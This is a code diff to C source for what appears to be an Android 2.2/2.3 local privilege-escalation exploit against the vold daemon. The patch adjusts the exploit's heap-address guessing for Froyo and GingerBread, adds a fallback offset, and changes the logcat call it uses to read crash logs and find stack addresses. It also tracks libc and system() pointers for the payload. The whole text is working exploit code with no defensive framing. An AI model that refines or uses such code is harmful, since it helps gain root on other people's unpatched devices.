@@ -47,6 +47,7 @@ static char *vold = "/system/bin/vold";
 uint32_t heap_addr;
 uint32_t libc_base;
 uint32_t heap_base_addr;
+uint32_t heap_offset;
 uint32_t r9 = 0, r10 = 0, fp = 0;
 uint32_t stack_addr = 0x41414141;
 uint32_t system_ptr = 0;
@@ -174,8 +175,10 @@ static void heap_oracle() {
 	while(bad_byte(heap_addr&0xff)) heap_addr += 0x20;
 	if(ok)
 		printf("[+] Overseer found a path ! 0x%08x\n", heap_addr);
-	else
+	else {
 		printf("[-] No path found, let's hope ...\n");
+		heap_addr = heap_base_addr + heap_offset;
+	}
 }
 
 
@@ -340,7 +343,7 @@ static uint32_t checkcrash()
 	unlink(crashlog);
 
 	if ((logcat_pid = fork()) == 0) {
-		char *a[] = {"/system/bin/logcat",  "-f", crashlog, NULL};
+		char *a[] = {"/system/bin/logcat", "-b", "main", "-f", crashlog, NULL};
 		execve(*a, a, environ);
 		exit(1);
 	}
@@ -423,7 +426,7 @@ static uint32_t find_stack_addr()
 	unlink(crashlog);
 
 	if ((logcat_pid = fork()) == 0) {
-		char *a[] = {"/system/bin/logcat",  "-f", crashlog, NULL};
+		char *a[] = {"/system/bin/logcat", "-b", "main", "-f", crashlog, NULL};
 		execve(*a, a, environ);
 		exit(1);
 	}
@@ -509,20 +512,21 @@ int main(int argc, char **argv, char **env)
 
 	stat(vold, &st);
 	heap_base_addr = ((((st.st_size) + 0x8000) / 0x1000) + 1) * 0x1000;
-	heap_addr = heap_base_addr;
 
 	__system_property_get("ro.build.version.release", version_release);
-	
+
 	if (strstr(version_release, "2.2")) {
-		heap_addr += 0x108;
-		printf("[+] Found a Froyo ! 0x%08x\n", heap_addr);
+		heap_offset = 0x108;
+		printf("[+] Found a Froyo ! 0x%08x\n", heap_offset);
 	} else if (strstr(version_release, "2.3")) {
-		heap_addr += 0x118;
-		printf("[+] Found a GingerBread ! 0x%08x\n", heap_addr);
+		heap_offset = 0x118;
+		printf("[+] Found a GingerBread ! 0x%08x\n", heap_offset);
 	} else {
 		printf("[-] Not a 2.2/2.3 Android ...\n");
 		exit(-1);
 	}
+
+	heap_addr = 0xffffff;
 
 	__system_property_get("ro.build.fingerprint", version_release);
 	if(!strncmp(version_release, "samsung", 7)) {
